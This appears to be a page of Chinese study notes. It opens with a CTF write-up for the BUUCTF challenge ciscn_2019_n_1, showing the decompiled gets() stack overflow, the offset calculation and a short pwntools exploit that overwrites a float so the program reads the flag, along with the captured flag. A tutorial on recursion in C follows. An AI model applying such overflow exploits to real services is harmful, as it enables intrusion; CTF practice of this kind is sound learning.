##### 9. ciscn_2019_n_1（BUUCTF）

关于这个题目，它的信息是这样的：

```bash
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

乍一看平平无奇，ida一看可不得了：

```c
int func()
{
  char v1[44]; // [rsp+0h] [rbp-30h] BYREF
  float v2; // [rsp+2Ch] [rbp-4h]

  v2 = 0.0;
  puts("Let's guess the number.");
  gets(v1);
  if ( v2 == 11.28125 )
    return system("cat /flag");
  else
    return puts("Its value should be 11.28125");
}
```

在这里它已经定义了v2=0.0，我们需要把这个值改成`v2 == 11.28125`，这里的`gets`它没有限制长度，所以很好用。

这里的话我们可以用`FLOAT_VAL = struct.pack('<f', 11.28125)`，struck.pack就是把浮点数打包成字符串，==<f就是表示写成小端序的字符串排列==。它等效于==FLOAT_VAL = b'\x00\x80\x34\x41'==。

计算`v2`偏移量的话：

```text
v1 起始地址 = rbp - 0x30
v2 起始地址 = rbp - 0x04
偏移 = (rbp - 0x04) - (rbp - 0x30)
     = 0x30 - 0x04
     = 0x2c
     = 44
```

因为你本质上用的是`gets`这个函数，你需要把它溢出出来，结果就是v1-v2。

写exp:

```python
from pwn import *

r=remote("1cd7dfb76579af264816a87a.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="1cd7dfb76579af264816a87a.tcp-ctf2.dasctf.com")

#FLOAT_VAL = struct.pack('<f', 11.28125)
FLOAT_VAL = b'\x00\x80\x34\x41'
payload=b'A'*(44)+FLOAT_VAL

r.sendline(payload)
r.interactive()
```

得到flag：`CTF2{6d1ad848-242f-4e3b-896f-47eca9f6e32b}`。

### 关于C语言中的函数递归

递归是指一个函数直接或间接地调用自身。C语言支持递归，递归在树、图、分治、回溯、动态规划等问题中很常用。

递归函数通常需要具备三个要素：

1. **终止条件**：什么时候停止递归；
2. **递推关系**：大问题如何拆成同类小问题；
3. **规模缩小**：每次递归调用都应向终止条件靠近。

例如：

```c
int factorial(int n) {
    if (n <= 1) {      // 终止条件
        return 1;
    }
    return n * factorial(n - 1); // 递推关系，规模缩小
}
```

#### 经典递归示例：

##### 1. 阶乘

```c
#include <stdio.h>

unsigned long long factorial(unsigned int n) {
    if (n == 0 || n == 1) {
        return 1;
    }
    return n * factorial(n - 1);
}

int main(void) {
    printf("%llu\n", factorial(10));
    return 0;
}
```

注意：阶乘增长非常快，`unsigned long long` 也会很快溢出，实际使用要考虑数据范围。

##### 2. 斐波那契数列

```c
int fib(int n) {
    if (n == 0) return 0;
    if (n == 1) return 1;
    return fib(n - 1) + fib(n - 2);
}
```

这个写法虽然直观，但存在大量重复计算，时间复杂度约为 O(2^n)，当 `n` 稍大时非常慢。
